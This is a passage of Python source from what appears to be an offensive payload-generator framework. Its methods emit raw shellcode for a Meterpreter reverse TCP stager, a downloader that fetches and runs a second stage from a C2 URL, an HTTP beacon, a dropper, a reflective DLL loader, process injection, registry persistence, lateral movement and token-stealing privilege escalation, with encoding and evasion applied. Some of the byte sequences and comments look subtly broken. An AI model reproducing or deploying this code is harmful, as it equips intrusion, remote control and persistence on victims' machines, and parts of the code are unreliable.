            shellcode = self._generate_privilege_escalation_payload(architecture, options)
        elif payload_type == PayloadType.SHELLCODE:
            shellcode = self._generate_raw_shellcode(architecture, options)
        elif payload_type == PayloadType.DLL_PAYLOAD:
            shellcode = self._generate_dll_payload(architecture, options)
        elif payload_type == PayloadType.CUSTOM:
            shellcode = self._generate_custom_payload(architecture, options)
        else:
            self.logger.warning(f"Payload type {payload_type.value} not implemented")
            return b"\x90" * 32  # NOP sled as fallback

        # Apply encoding if specified
        if encoding != EncodingType.NONE:
            key = options.get("encoding_key")
            shellcode = self.generate_encoded_shellcode(shellcode, encoding, key)

        # Apply evasion techniques if specified
        if evasion and evasion != [EvasionTechnique.NONE]:
            shellcode = self.add_evasion_techniques(shellcode, evasion, architecture)

        self.logger.debug(f"Final custom shellcode length: {len(shellcode)}")
        return shellcode

    def _generate_meterpreter_stager(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate Meterpreter stager shellcode."""
        lhost = options.get("lhost", "127.0.0.1")
        lport = options.get("lport", 4444)

        if architecture == Architecture.X86:
            # x86 Meterpreter reverse TCP stager
            ip_bytes = socket.inet_aton(lhost)
            port_bytes = struct.pack(">H", lport)

            return (
                b"\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14"  # PEB walk
                b"\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda\x8b"
                b"\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41"
                b"\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81"  # Find GetProcAddress
                b"\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64"
                b"\x64\x72\x65\x75\xe2\x8b\x72\x24\x01\xde\x66\x8b"
                b"\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01"
                b"\xda\x31\xc9\x53\x52\x51\x68\x61\x72\x79\x41\x68"  # LoadLibraryA
                b"\x4c\x69\x62\x72\x68\x4c\x6f\x61\x64\x54\x53\xff"
                b"\xd2\x83\xc4\x0c\x59\x50\x51\x66\xb9\x6c\x6c\x51"
                b"\x68\x32\x2e\x64\x6c\x68\x77\x73\x32\x5f\x54\xff"  # ws2_32.dll
                b"\xd0\x83\xc4\x10\x8b\x54\x24\x04\x68\x75\x70\x00"
                b"\x00\x68\x74\x61\x72\x74\x68\x57\x53\x41\x53\x54"  # WSAStartup
                b"\x50\xff\xd2\x83\xc4\x08\x8b\x54\x24\x04\x68\x41"
                b"\x00\x00\x00\x68\x6f\x63\x6b\x65\x68\x57\x53\x41"  # WSASocketA
                b"\x53\x54\x50\xff\xd2\x83\xc4\x0c\x89\xc3\x31\xc9"
                b"\x51\x51\x68"
                + ip_bytes
                + b"\x68\x02\x00"
                + port_bytes  # Connect params
                + b"\x89\xe1\x6a\x10\x51\x53\x8b\x54\x24\x14\x68\x63"
                b"\x74\x00\x00\x68\x6e\x6e\x65\x63\x68\x57\x53\x41"  # WSAConnect
                b"\x43\x54\x50\xff\xd2\x83\xc4\x10\x31\xc0\x50\x50"
                b"\x50\x6a\x02\x50\x50\x68\x00\x10\x00\x00\x53\x8b"  # recv stage
                b"\x54\x24\x24\x68\x76\x00\x00\x00\x68\x72\x65\x63"
                b"\x76\x54\x50\xff\xd2"
            )
        # x64 Meterpreter stager
        ip_int = struct.unpack(">I", socket.inet_aton(lhost))[0]

        return (
            b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51"
            b"\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52"
            b"\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72"
            b"\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0"
            b"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
            b"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b"
            b"\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
            b"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48"
            b"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44"
            b"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41"
            b"\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
            b"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1"
            b"\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44"
            b"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
            b"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
            b"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
            b"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
            b"\x59\x5a\x48\x8b\x12\xe9\x4b\xff\xff\xff\x5d\x48"
            b"\xba" + struct.pack("<Q", (ip_int << 32) | (2 << 16) | lport) + b"\x48\x89\xe6\x48\x31\xc9\x66\xb9\x6c\x01\x49\x89"
            b"\xe2\x4d\x31\xc0\x4c\x89\xe0\x48\x31\xd2\x48\x89"
            b"\xd1\x41\xba\xea\x0f\xdf\xe0\xff\xd5"
        )

    def _generate_staged_payload(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate staged payload that downloads and executes second stage."""
        # Temporarily comment out for Day 2.1 testing
        # default_c2_url = get_service_url("c2_server")
        default_c2_url = "http://127.0.0.1:8080"  # Fallback for testing
        stage_url = options.get("stage_url", f"{default_c2_url}/stage")

        if architecture == Architecture.X86:
            # Dynamic API resolution shellcode for x86
            shellcode = bytes(
                [
                    # Get kernel32.dll base address via PEB
                    0x31,
                    0xC0,  # XOR EAX, EAX
                    0x64,
                    0x8B,
                    0x40,
                    0x30,  # MOV EAX, FS:[EAX+0x30] - PEB
                    0x8B,
                    0x40,
                    0x0C,  # MOV EAX, [EAX+0x0C] - PEB_LDR_DATA
                    0x8B,
                    0x70,
                    0x14,  # MOV ESI, [EAX+0x14] - InMemoryOrderModuleList
                    0xAD,  # LODSD - Skip first entry
                    0x96,  # XCHG ESI, EAX
                    0xAD,  # LODSD - Get second entry (kernel32.dll)
                    0x8B,
                    0x58,
                    0x10,  # MOV EBX, [EAX+0x10] - DllBase of kernel32
                    # Find LoadLibraryA address dynamically
                    0x8B,
                    0x53,
                    0x3C,  # MOV EDX, [EBX+0x3C] - e_lfanew
                    0x01,
                    0xDA,  # ADD EDX, EBX
                    0x8B,
                    0x52,
                    0x78,  # MOV EDX, [EDX+0x78] - Export table RVA
                    0x01,
                    0xDA,  # ADD EDX, EBX
                    0x8B,
                    0x72,
                    0x20,  # MOV ESI, [EDX+0x20] - Names RVA
                    0x01,
                    0xDE,  # ADD ESI, EBX
                    0x31,
                    0xC9,  # XOR ECX, ECX
                    # Search for LoadLibraryA by hash
                    # Hash comparison loop
                    0x41,  # INC ECX
                    0xAD,  # LODSD
                    0x01,
                    0xD8,  # ADD EAX, EBX
                    0x81,
                    0x38,
                    0x4C,
                    0x6F,
                    0x61,
                    0x64,  # CMP DWORD [EAX], 'Load'
                    0x75,
                    0xF4,  # JNZ loop
                    0x81,
                    0x78,
                    0x08,
                    0x72,
                    0x61,
                    0x72,
                    0x79,  # CMP DWORD [EAX+8], 'rary'
                    0x75,
                    0xEB,  # JNZ loop
                    # Found LoadLibraryA - get its address
                    0x8B,
                    0x72,
                    0x24,  # MOV ESI, [EDX+0x24] - Ordinals RVA
                    0x01,
                    0xDE,  # ADD ESI, EBX
                    0x66,
                    0x8B,
                    0x0C,
                    0x4E,  # MOV CX, [ESI+ECX*2]
                    0x49,  # DEC ECX
                    0x8B,
                    0x72,
                    0x1C,  # MOV ESI, [EDX+0x1C] - Functions RVA
                    0x01,
                    0xDE,  # ADD ESI, EBX
                    0x8B,
                    0x14,
                    0x8E,  # MOV EDX, [ESI+ECX*4]
                    0x01,
                    0xDA,  # ADD EDX, EBX - LoadLibraryA address in EDX
                    # Push urlmon.dll string
                    0x68,
                    0x6F,
                    0x6E,
                    0x00,
                    0x00,  # PUSH 'on\x00\x00'
                    0x68,
                    0x75,
                    0x72,
                    0x6C,
                    0x6D,  # PUSH 'urlm'
                    0x54,  # PUSH ESP - urlmon.dll string
                    0xFF,
                    0xD2,  # CALL EDX (LoadLibraryA)
                    0x89,
                    0xC7,  # MOV EDI, EAX - Save urlmon base
                    # Find GetProcAddress dynamically
                    0x89,
                    0xD8,  # MOV EAX, EBX - kernel32 base
                    0x8B,
                    0x50,
                    0x3C,  # MOV EDX, [EAX+0x3C]
                    0x01,
                    0xC2,  # ADD EDX, EAX
                    0x8B,
                    0x52,
                    0x78,  # MOV EDX, [EDX+0x78]
                    0x01,
                    0xC2,  # ADD EDX, EAX
                    0x8B,
                    0x72,
                    0x20,  # MOV ESI, [EDX+0x20]
                    0x01,
                    0xC6,  # ADD ESI, EAX
                    0x31,
                    0xC9,  # XOR ECX, ECX
                    # Search for GetProcAddress
                    0x41,  # INC ECX
                    0xAD,  # LODSD
                    0x01,
                    0xC0,  # ADD EAX, EAX
                    0x81,
                    0x38,
                    0x47,
                    0x65,
                    0x74,
                    0x50,  # CMP DWORD [EAX], 'GetP'
                    0x75,
                    0xF4,  # JNZ loop
                    # Get GetProcAddress address
                    0x8B,
                    0x72,
                    0x24,  # MOV ESI, [EDX+0x24]
                    0x01,
                    0xC6,  # ADD ESI, EAX
                    0x66,
                    0x8B,
                    0x0C,
                    0x4E,  # MOV CX, [ESI+ECX*2]
                    0x49,  # DEC ECX
                    0x8B,
                    0x72,
                    0x1C,  # MOV ESI, [EDX+0x1C]
                    0x01,
                    0xC6,  # ADD ESI, EAX
                    0x8B,
                    0x34,
                    0x8E,  # MOV ESI, [ESI+ECX*4]
                    0x01,
                    0xC6,  # ADD ESI, EAX - GetProcAddress in ESI
                    # Push URLDownloadToFileA string
                    0x68,
                    0x41,
                    0x00,
                    0x00,
                    0x00,  # PUSH 'A\x00\x00\x00'
                    0x68,
                    0x46,
                    0x69,
                    0x6C,
                    0x65,  # PUSH 'File'
                    0x68,
                    0x6F,
                    0x61,
                    0x64,
                    0x54,  # PUSH 'oadT'
                    0x68,
                    0x6F,
                    0x77,
                    0x6E,
                    0x6C,  # PUSH 'ownl'
                    0x68,
                    0x55,
                    0x52,
                    0x4C,
                    0x44,  # PUSH 'URLD'
                    0x54,  # PUSH ESP - Function name
                    0x57,  # PUSH EDI - urlmon.dll base
                    0xFF,
                    0xD6,  # CALL ESI (GetProcAddress)
                    # Prepare download parameters
                    0x31,
                    0xC9,  # XOR ECX, ECX
                    0x51,  # PUSH ECX - lpfnCB = NULL
                    0x51,  # PUSH ECX - dwReserved = 0
                    # Push temp file path
                    0x68,
                    0x78,
                    0x65,
                    0x00,
                    0x00,  # PUSH 'xe\x00\x00'
                    0x68,
                    0x74,
                    0x2E,
                    0x65,
                    0x78,  # PUSH 't.ex'
                    0x68,
                    0x5C,
                    0x6F,
                    0x75,
                    0x74,  # PUSH '\\out'
                    0x68,
                    0x74,
                    0x65,
                    0x6D,
                    0x70,  # PUSH 'temp'
                    0x68,
                    0x43,
                    0x3A,
                    0x5C,
                    0x5C,  # PUSH 'C:\\\\'
                    0x8D,
                    0x1C,
                    0x24,  # LEA EBX, [ESP] - File path
                    0x53,  # PUSH EBX - szFileName
                    # Push URL (dynamically built)
                    0x68,
                    0x00,
                    0x00,
                    0x00,
                    0x00,  # Placeholder for URL terminator
                ]
            )

            # Add URL bytes
            url_bytes = stage_url.encode("utf-8")
            # Push URL in reverse order (x86 is little-endian)
            for i in range(len(url_bytes) - 1, -1, -4):
                chunk = url_bytes[max(0, i - 3) : i + 1]
                if len(chunk) < 4:
                    chunk = chunk + b"\x00" * (4 - len(chunk))
                shellcode += b"\x68" + chunk[::-1]  # PUSH chunk

            shellcode += bytes(
                [
                    0x8D,
                    0x34,
                    0x24,  # LEA ESI, [ESP] - URL
                    0x56,  # PUSH ESI - szURL
                    0x51,  # PUSH ECX - pCaller = NULL
                    0xFF,
                    0xD0,  # CALL EAX (URLDownloadToFileA)
                    # Execute downloaded file
                    0x31,
                    0xC0,  # XOR EAX, EAX
                    0x50,  # PUSH EAX - nShowCmd = 0
                    0x53,  # PUSH EBX - lpFile (temp file path)
                    0x53,  # PUSH EBX - lpOperation
                    0x50,  # PUSH EAX - hwnd = NULL
                    0x50,  # PUSH EAX - lpVerb = NULL
                    0x50,  # PUSH EAX - lpParameters = NULL
                    # Find and call ShellExecuteA
                    0xB8,
                    0x11,
                    0x11,
                    0x11,
                    0x11,  # MOV EAX, shell32.dll base (will be resolved)
                    0xFF,
                    0xD0,  # CALL EAX (ShellExecuteA)
                    0xC3,  # RET
                ]
            )

            return shellcode

        # x64 staged payload
        return self._generate_x64_downloader_shellcode(stage_url)

    def _generate_beacon_payload(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate beacon-style callback payload."""
        callback_url = options.get("callback_url", "https://127.0.0.1:443/beacon")
        interval = options.get("interval", 60)  # seconds

        if architecture == Architecture.X86:
            # HTTP beacon for x86
            return (
                b"\x60\x31\xd2\x52\x68\x63\x6d\x64\x00\x89\xe6\x52"  # Setup
                b"\x68\x2e\x64\x6c\x6c\x68\x65\x6c\x33\x32\x68\x6b"  # kernel32.dll
                b"\x65\x72\x6e\x89\xe3\x52\x53\x52\xff\xd0\x52\x68"
                b"\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x89\xe3\x52"  # wininet
                b"\x53\x52\xff\xd0\x52\x68\x70\x65\x6e\x41\x68\x65"  # InternetOpenA
                b"\x74\x4f\x70\x68\x6e\x74\x65\x72\x68\x49\x6e\x74"
                b"\x89\xe1\x51\x50\xff\xd6\x52\x68\x6e\x65\x63\x74"  # InternetConnect
                b"\x68\x6f\x6e\x6e\x65\x68\x65\x74\x43\x68\x6e\x74"
                b"\x65\x72\x68\x49\x6e\x74\x89\xe1\x51\x50\xff\xd6"
                b"\x52\x68\x65\x73\x74\x41\x68\x52\x65\x71\x75\x68"  # HttpOpenRequestA
                b"\x70\x4f\x70\x65\x68\x48\x74\x74\x70\x89\xe1\x51"
                b"\x50\xff\xd6" + struct.pack("<I", interval)  # Beacon interval
            )
        # x64 beacon
        return self._generate_x64_beacon_shellcode(callback_url, interval)

    def _generate_dropper_payload(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate dropper payload that drops and executes a file."""
        drop_path = options.get("drop_path", "C:\\Windows\\Temp\\payload.exe")
        file_data = options.get("file_data", b"")

        if architecture == Architecture.X86:
            # File dropper for x86
            path_len = len(drop_path) + 1
            path_bytes = drop_path.encode("utf-8") + b"\x00"

            return (
                b"\x60\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61"  # Setup
                b"\x6c\x63\x89\xe3\x50\x53\x50\x68\x44\x6c\x6c\x00"  # kernel32.dll
                b"\x68\x65\x6c\x33\x32\x68\x6b\x65\x72\x6e\x89\xe1"
                b"\x51\xff\xd0\x50\x68\x46\x69\x6c\x65\x68\x72\x69"  # WriteFile
                b"\x74\x65\x68\x57\x72\x69\x74\x65\x89\xe1\x51\x50"
                b"\xff\xd6\x50\x68\x46\x69\x6c\x65\x68\x65\x61\x74"  # CreateFile
                b"\x65\x68\x43\x72\x65\x61\x74\x89\xe1\x51\x50\xff"
                b"\xd6"
                + struct.pack("<I", len(file_data))
                + struct.pack("<I", path_len)
                + path_bytes[:64]  # Include path length and truncate if too long
            )
        # x64 dropper
        return self._generate_x64_dropper_shellcode(drop_path, file_data)

    def _generate_loader_payload(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate reflective DLL loader payload."""
        dll_data = options.get("dll_data", b"")
        entry_point = options.get("entry_point", "DllMain")

        if architecture == Architecture.X86:
            # Reflective DLL loader for x86 with dynamic API resolution
            shellcode = bytes(
                [
                    0x60,  # PUSHAD - Save all registers
                    # Get kernel32.dll base address from PEB
                    0x64,
                    0xA1,
                    0x30,
                    0x00,
                    0x00,
                    0x00,  # MOV EAX, FS:[0x30] - PEB
                    0x8B,
                    0x40,
                    0x0C,  # MOV EAX, [EAX+0x0C] - PEB_LDR_DATA
                    0x8B,
                    0x40,
                    0x14,  # MOV EAX, [EAX+0x14] - InMemoryOrderModuleList
                    0xAD,  # LODSD
                    0x96,  # XCHG ESI, EAX
                    0xAD,  # LODSD
                    0x8B,
                    0x58,
                    0x10,  # MOV EBX, [EAX+0x10] - kernel32.dll base
                    # Find VirtualAlloc dynamically
                    0x89,
                    0xDF,  # MOV EDI, EBX - Save kernel32 base
                    0x8B,
                    0x53,
                    0x3C,  # MOV EDX, [EBX+0x3C] - e_lfanew
                    0x01,
                    0xDA,  # ADD EDX, EBX
                    0x8B,
                    0x52,
                    0x78,  # MOV EDX, [EDX+0x78] - Export table
                    0x01,
                    0xDA,  # ADD EDX, EBX
                    0x8B,
                    0x72,
                    0x20,  # MOV ESI, [EDX+0x20] - Names table
                    0x01,
                    0xDE,  # ADD ESI, EBX
                    0x31,
                    0xC9,  # XOR ECX, ECX
                    # Search loop for VirtualAlloc
                    0x41,  # INC ECX
                    0xAD,  # LODSD
                    0x01,
                    0xD8,  # ADD EAX, EBX
                    0x81,
                    0x38,
                    0x56,
                    0x69,
                    0x72,
                    0x74,  # CMP DWORD [EAX], 'Virt'
                    0x75,
                    0xF4,  # JNZ loop
                    0x81,
                    0x78,
                    0x08,
                    0x6C,
                    0x6C,
                    0x6F,
                    0x63,  # CMP DWORD [EAX+8], 'lloc'
                    0x75,
                    0xEB,  # JNZ loop
                    # Found VirtualAlloc - get address
                    0x8B,
                    0x72,
                    0x24,  # MOV ESI, [EDX+0x24] - Ordinals
                    0x01,
                    0xDE,  # ADD ESI, EBX
                    0x66,
                    0x8B,
                    0x0C,
                    0x4E,  # MOV CX, [ESI+ECX*2]
                    0x49,  # DEC ECX
                    0x8B,
                    0x72,
                    0x1C,  # MOV ESI, [EDX+0x1C] - Functions
                    0x01,
                    0xDE,  # ADD ESI, EBX
                    0x8B,
                    0x04,
                    0x8E,  # MOV EAX, [ESI+ECX*4]
                    0x01,
                    0xD8,  # ADD EAX, EBX - VirtualAlloc in EAX
                    0x89,
                    0xC6,  # MOV ESI, EAX - Save VirtualAlloc
                    # Allocate memory for DLL
                    0x68,
                    0x40,
                    0x00,
                    0x00,
                    0x00,  # PUSH PAGE_EXECUTE_READWRITE
                    0x68,
                    0x00,
                    0x30,
                    0x00,
                    0x00,  # PUSH MEM_COMMIT | MEM_RESERVE
                ]
            )

            # Add size of DLL data
            dll_size = len(dll_data) if dll_data else 0x10000  # Default 64KB
            shellcode += struct.pack("<I", dll_size)
            shellcode += bytes([0x68])  # PUSH prefix

            shellcode += bytes(
                [
                    0x6A,
                    0x00,  # PUSH 0 (lpAddress = NULL)
                    0xFF,
                    0xD6,  # CALL ESI (VirtualAlloc)
                    0x89,
                    0xC7,  # MOV EDI, EAX - Save allocated memory
                    # Copy DLL to allocated memory
                    0x89,
                    0xFE,  # MOV ESI, EDI - Destination
                ]
            )

            # Add DLL data pointer (will be patched at runtime)
            shellcode += bytes(
                [
                    0xBE,  # MOV ESI, imm32
                ]
            )
            shellcode += struct.pack("<I", 0x00400000 + len(shellcode) + 100)  # Offset to DLL data

            shellcode += bytes(
                [
                    0xB9,  # MOV ECX, imm32
                ]
            )
            shellcode += struct.pack("<I", dll_size)  # Size to copy

            shellcode += bytes(
                [
                    0xF3,
                    0xA4,  # REP MOVSB - Copy DLL data
                    # Parse PE headers to find entry point
                    0x89,
                    0xFE,  # MOV ESI, EDI - PE base
                    0x8B,
                    0x46,
                    0x3C,  # MOV EAX, [ESI+0x3C] - e_lfanew
                    0x01,
                    0xF0,  # ADD EAX, ESI
                    0x8B,
                    0x78,
                    0x28,  # MOV EDI, [EAX+0x28] - AddressOfEntryPoint
                    0x01,
                    0xF7,  # ADD EDI, ESI - Entry point address
                    # Process relocations
                    0x8B,
                    0x50,
                    0xA4,  # MOV EDX, [EAX+0xA4] - Relocation table RVA
                    0x01,
                    0xF2,  # ADD EDX, ESI
                    0x8B,
                    0x4A,
                    0x04,  # MOV ECX, [EDX+0x04] - Block size
                    # Relocation processing loop
                    0x83,
                    0xF9,
                    0x00,  # CMP ECX, 0
                    0x74,
                    0x20,  # JZ done_relocs
                    0x83,
                    0xE9,
                    0x08,  # SUB ECX, 8 - Header size
                    0x8D,
                    0x5A,
                    0x08,  # LEA EBX, [EDX+8] - First relocation
                    # Process each relocation entry
                    0x66,
                    0x8B,
                    0x03,  # MOV AX, [EBX]
                    0x66,
                    0x25,
                    0xFF,
                    0x0F,  # AND AX, 0x0FFF - Offset
                    0x01,
                    0xD0,  # ADD EAX, EDX - Add page RVA
                    0x01,
                    0xF0,  # ADD EAX, ESI - Add base
                    0x8B,
                    0x00,  # MOV EAX, [EAX] - Read value
                    0x29,
                    0xF0,  # SUB EAX, ESI - Remove old base
                    0x01,
                    0xF8,  # ADD EAX, EDI - Add new base
                    0x89,
                    0x00,  # MOV [EAX], EAX - Write relocated value
                    0x83,
                    0xC3,
                    0x02,  # ADD EBX, 2 - Next entry
                    0x83,
                    0xE9,
                    0x02,  # SUB ECX, 2
                    0x75,
                    0xE5,  # JNZ reloc_loop
                    # Resolve imports
                    0x8B,
                    0x50,
                    0x80,  # MOV EDX, [EAX+0x80] - Import table RVA
                    0x01,
                    0xF2,  # ADD EDX, ESI
                    # Import processing loop
                    0x8B,
                    0x1A,  # MOV EBX, [EDX] - OriginalFirstThunk
                    0x85,
                    0xDB,  # TEST EBX, EBX
                    0x74,
                    0x30,  # JZ done_imports
                    0x01,
                    0xF3,  # ADD EBX, ESI
                    0x8B,
                    0x7A,
                    0x10,  # MOV EDI, [EDX+0x10] - FirstThunk
                    0x01,
                    0xF7,  # ADD EDI, ESI
                    # Process each import
                    0x8B,
                    0x0B,  # MOV ECX, [EBX]
                    0x85,
                    0xC9,  # TEST ECX, ECX
                    0x74,
                    0x1E,  # JZ next_dll
                    0xF7,
                    0xC1,
                    0x00,
                    0x00,
                    0x00,
                    0x80,  # TEST ECX, 0x80000000
                    0x75,
                    0x0C,  # JNZ by_ordinal
                    # By name
                    0x01,
                    0xF1,  # ADD ECX, ESI
                    0x83,
                    0xC1,
                    0x02,  # ADD ECX, 2 - Skip hint
                    # Resolve and store function address
                    0x51,  # PUSH ECX - Function name
                    0xFF,
                    0x72,
                    0x0C,  # PUSH [EDX+0x0C] - DLL handle
                    # Call GetProcAddress (already resolved)
                    0xFF,
                    0xD0,  # CALL EAX
                    0x89,
                    0x07,  # MOV [EDI], EAX - Store function address
                    0x83,
                    0xC3,
                    0x04,  # ADD EBX, 4
                    0x83,
                    0xC7,
                    0x04,  # ADD EDI, 4
                    0xEB,
                    0xDA,  # JMP import_loop
                    # Call DLL entry point
                    0x6A,
                    0x00,  # PUSH 0 - lpReserved
                    0x6A,
                    0x01,  # PUSH 1 - DLL_PROCESS_ATTACH
                    0x56,  # PUSH ESI - hinstDLL
                    0xFF,
                    0xD7,  # CALL EDI - DllMain
                    0x61,  # POPAD
                    0xC3,  # RET
                ]
            )

            return shellcode

        # x64 reflective loader
        return self._generate_x64_reflective_loader(dll_data, entry_point)

    def _generate_injector_payload(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate process injection payload."""
        target_process = options.get("target_process", "explorer.exe")
        injection_type = options.get("injection_type", "classic")  # classic, apc, setcontext

        if architecture == Architecture.X86:
            # Process injector for x86
            return (
                b"\x31\xc0\x50\x68\x65\x78\x65\x00\x68\x6f\x72\x65"  # explorer.exe
                b"\x72\x2e\x68\x65\x78\x70\x6c\x89\xe1\x50\x68\x73"
                b"\x73\x00\x00\x68\x50\x72\x6f\x63\x68\x4f\x70\x65"  # OpenProcess
                b"\x6e\x89\xe3\x50\x51\x68\xff\x0f\x1f\x00\x6a\x00"
                b"\xff\xd3\x89\xc6\x50\x68\x6f\x63\x00\x00\x68\x41"  # VirtualAllocEx
                b"\x6c\x6c\x6f\x68\x75\x61\x6c\x41\x68\x56\x69\x72"
                b"\x74\x89\xe3\x50\x68\x00\x10\x00\x00\x68\x00\x00"
                b"\x10\x00\x6a\x40\x6a\x00\x56\xff\xd3"
            )
        # x64 injector
        return self._generate_x64_injector(target_process, injection_type)

    def _generate_persistence_payload(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate persistence establishment payload."""
        persistence_type = options.get("type", "registry")  # registry, service, scheduled_task

        if architecture == Architecture.X86:
            # Registry persistence for x86
            return (
                b"\x31\xc0\x50\x68\x2e\x65\x78\x65\x68\x63\x61\x6c"  # calc.exe
                b"\x63\x89\xe7\x50\x68\x79\x41\x00\x00\x68\x65\x67"  # RegSetValueExA
                b"\x56\x61\x68\x53\x65\x74\x56\x68\x52\x65\x67\x89"
                b"\xe3\x50\x68\x79\x45\x78\x41\x68\x4f\x70\x65\x6e"  # RegOpenKeyExA
                b"\x4b\x68\x52\x65\x67\x89\xe1\x50\x68\x6e\x5c\x52"
                b"\x75\x68\x73\x69\x6f\x6e\x68\x5c\x56\x65\x72\x68"
                b"\x6e\x64\x6f\x77\x73\x68\x5c\x57\x69\x6e\x68\x77"
                b"\x61\x72\x65\x68\x53\x6f\x66\x74\x89\xe2"
            )
        # x64 persistence
        return self._generate_x64_persistence(persistence_type, options)

    def _generate_lateral_movement_payload(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate lateral movement payload."""
        target_host = options.get("target_host", "192.168.1.100")
        method = options.get("method", "psexec")  # psexec, wmi, rdp

        if architecture == Architecture.X86:
            # PsExec-style lateral movement for x86
            return (
                b"\x31\xc0\x50\x68\x63\x6d\x64\x00\x89\xe6\x50\x68"  # cmd
                b"\x65\x78\x65\x63\x68\x50\x73\x45\x78\x89\xe3\x50"  # PsExec
                b"\x68\x41\x70\x69\x00\x68\x6e\x65\x74\x41\x68\x57"  # WNetAddConnection
                b"\x4e\x65\x74\x89\xe1\x50\x68\x24\x00\x00\x00\x68"  # IPC$ share
                b"\x49\x50\x43\x24\x68\x5c\x5c" + socket.inet_aton(target_host) + b"\x89\xe2\x50\x52\x6a\x00\x6a\x00\xff\xd1"
            )
        # x64 lateral movement
        return self._generate_x64_lateral_movement(target_host, method)

    def _generate_privilege_escalation_payload(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate privilege escalation payload."""
        exploit_type = options.get("exploit_type", "token_stealing")

        if architecture == Architecture.X86:
            # Token stealing for x86
            return (
                b"\x60\x64\xa1\x24\x01\x00\x00\x8b\x40\x50\x89\xc1"  # Get EPROCESS
                b"\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x39"  # Find SYSTEM
                b"\x90\xb8\x00\x00\x00\x75\xed\x8b\x90\xf8\x00\x00"
                b"\x00\x89\x91\xf8\x00\x00\x00\x61\xc3"  # Copy token
            )
        # x64 privilege escalation
        return self._generate_x64_priv_esc(exploit_type)

    def _generate_raw_shellcode(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate raw shellcode based on user-provided assembly or bytes."""
        if "assembly" in options:
            # Compile assembly code
            try:
                from ...asm.compiler import AssemblyCompiler

                compiler = AssemblyCompiler()
                return compiler.compile_assembly(options["assembly"], architecture)
            except Exception as e:
                logger.debug(f"Failed to compile assembly: {e}")

        if "bytes" in options:
            # Return raw bytes
            return bytes.fromhex(options["bytes"].replace(" ", "").replace("\\x", ""))

        # Default: return NOP sled
        nop = b"\x90" if architecture in [Architecture.X86, Architecture.X64] else b"\x00"
        return nop * options.get("size", 100)

    def _generate_dll_payload(self, architecture: Architecture, options: dict[str, Any]) -> bytes:
        """Generate DLL payload."""
        export_name = options.get("export_name", "DllMain")

        if architecture == Architecture.X86:
            # Minimal DLL for x86
            return (
                b"\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00"  # MZ header
                b"\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00"
                b"\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x00"  # PE offset
                b"\x50\x45\x00\x00\x4c\x01\x01\x00\x00\x00\x00\x00"  # PE header
                b"\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x02\x01"
                b"\x0b\x01\x08\x00\x00\x10\x00\x00\x00\x00\x00\x00"
                b"\x00\x00\x00\x00\x00\x10\x00\x00\x00\x10\x00\x00"
                b"\x00\x00\x40\x00\x00\x00\x00\x00\x00\x10\x00\x00"
                b"\x00\x02\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00"
                b"\x04\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00"  # DLL characteristics
                b"\x00\x10\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00"
                b"\x00\x00\x10\x00\x00\x10\x00\x00\x00\x00\x10\x00"
                b"\x00\x10\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00"  # Section headers
                b"\x2e\x74\x65\x78\x74\x00\x00\x00\x00\x10\x00\x00"  # .text
                b"\x00\x10\x00\x00\x00\x10\x00\x00\x00\x02\x00\x00"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                b"\x20\x00\x00\x60"  # Section characteristics
                b"\x55\x89\xe5\xb8\x01\x00\x00\x00\x5d\xc2\x0c\x00"  # DllMain: return TRUE
            )
        # x64 DLL
        return self._generate_x64_dll_shellcode(export_name)

